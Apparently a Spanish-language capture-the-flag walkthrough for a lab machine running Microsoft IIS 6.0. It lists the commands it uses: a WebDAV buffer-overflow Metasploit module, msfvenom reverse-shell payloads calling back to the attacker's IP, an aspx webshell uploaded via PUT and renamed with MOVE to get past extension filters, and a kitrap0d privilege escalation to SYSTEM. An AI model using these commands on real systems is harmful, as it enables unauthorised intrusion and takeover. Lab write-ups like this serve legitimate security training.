PORT   STATE SERVICE
80/tcp open  http

-Hacemos fuzzing pero no encontramos nada

-El escaneo profundo de nmap nos ha reportado que en el puerto 80 hay una versión de IIS muy antigua --> **Microsoft IIS 6.0**

### Explotación: 2 Formas

#### 1-Metasploit

-Buscamos en google y encontramos lo siguiente:
	-Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow

-Buscamos el exploit en Metasploit:
	-Search Microsoft IIS 6.0
		-Módulo --> **exploit/windows/iis/iis_webdav_scstoragepathfromurl**
		-set rhosts 10.10.10.15
		-set lhost 10.10.14.29
		-run
			-meterpreter > 
			(La consola no es muy funcional, por lo que no renta mucho. No nos deja escalar privilegios con otros módulos ni nada)

#### 2-Manual: Subir archivo .aspx 

-Miramos el contenido del escaneo profundo de nmap:
	Public Options: **PUT** y **MOVE** , entre otros.

-Esto significa que tiene un webdav en el que podemos subir archivos con el método **PUT**, y además podemos cambiar el nombre de archivos con **MOVE**.

-Utilizamos davtest para ver que extensiones podemos subir:
	-davtest -url http://10.10.10.15/
		-Resultado: Podemos subir bastantes, pero **asp** y **aspx** **no nos deja**, que son las que nos interesa para ganar acceso a la máquina.

-Aunque no podamos subir archivos .aspx , como podemos renombrar archivos con MOVE, vamos a generar un archivo .aspx y lo vamos a subir como un .txt. Dentro le vamos a cambiar la extensión a .aspx otra vez.

-Archivo aspx a subir: 2 opciones:
	1-Sesión de meterpreter con msfvenom:
		-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f aspx -o exploit.aspx
		**-Cambiamos la extension: mv exploit.aspx exploit.txt**
	2-Subir una webshell:
		-locate webshells:
			**-/usr/share/webshells/aspx/cmdasp.aspx**
			**-Cambiamos la extension: mv cmdasp.aspx cmdasp.txt**

-**2 Formas** de subir archivos a un **webdav**:
	1-Cadaver:
		-cadaver http://10.10.10.15/
			dav:/> put exploit.aspx 
	2-Curl:
		-curl -X PUT http://10.10.10.15/exploit.txt -d @exploit.txt

-Una vez subido el archivo, cambiamos la extension a .aspx:
	1-Cadaver:
		-dav:/> mv exploit.txt exploit.aspx
	2-Curl
		-curl -X MOVE -H "Destination:http://10.10.10.15/exploit.aspx" http://10.10.10.15/exploit.txt 

-Ganar acceso a la máquina:
	1-Con exploit.aspx (sesión de meterpreter):
		-Metasploit: Módulo --> multi/handler
			-set lhost 10.10.14.29
			-set payload windows/meterpreter/reverse_tcp
			-run
			-Ejecutamos el archivo desde http://10.10.10.15/exploit.aspx
				-meterpreter > getuid
					NT AUTHORITY\NETWORK SERVICE
	2-Con cmdasp.aspx (webshell):
		-Creamos .exe con msfvenom:
			-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe -o exploit.exe
		-Iniciamos un servidor con impacket-smbserver:
			-impacket-smbserver smb .
		-Nos ponemos en escucha en el **multi/handler**
		-Ejecutamos el .exe desde la webshell (http://10.10.10.15/cmdasp.aspx):
			-\\10.10.14.29\smb\exploit.exe
		-Hemos obtenido la conexión en el multi/handler:
			-meterpreter > getuid
				NT AUTHORITY\NETWORK SERVICE

## Escalada de Privilegios

-Ponemos la sesión actual de meterpreter en segundo plano:
	-background
	
-Utilizamos el siguiente módulo de Metasploit:
	-Módulo --> **post/multi/recon/local_exploit_suggester**
		-set session 1
		-run:
			-Salen varios exploit con los que podemos escalar, vamos a usar este:
				-Módulo exploit/windows/local/ms10_015_kitrap0d
				-set lhost 10.10.14.29
				-set lport 4445 (Cambiamos el puerto)
				-run
					-meterpreter > NT\AUTHORITY SYSTEM

**-NOTA:** No nos deja invocar un shell. Esto sucede porque estamos en un proceso en el que no podemos hacerlo. Tenemos que cambiar a otro proceso como --> **'explorer.exe'** , **'winlogon.exe'** , **lsass.exe**:
	-pgrep winlogon.exe'
		-No nos deja tampoco
	-ps:
		-el PYD de winlogon.exe es --> 344
		-Migrate 344
			-meterpreter > shell
				C:\WINDOWS\system32> 
				(YA NOS DEJA OPERAR DESDE LA SHELL!!)






